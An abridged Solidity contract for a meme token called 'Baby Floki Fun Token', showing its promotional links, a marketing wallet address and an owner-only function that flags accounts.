...
/*
Website   : https://babyshibaflokidoge.fun

Telegram  : https://t.me/babyshibadogeinutoken

Twitter   : https://twitter.com/BabyShibaFloki3
*/
...
contract BABYFLOKINU is Context, IERC20, Ownable {
    ...
    string private _name = "Baby Floki Fun Token";
    string private _symbol = "BabyFlokiInu";
    ...
    address public marketingWallet = 0x336e32c3c1ACD67336AC6BB0762dB89Ae30C8812;
    ...
    function setIsWhaleFlag(address account, bool flag) external onlyOwner() {
            isFlagged[account] = flag;
    }
...
// Contract Developer: https://dapprex.com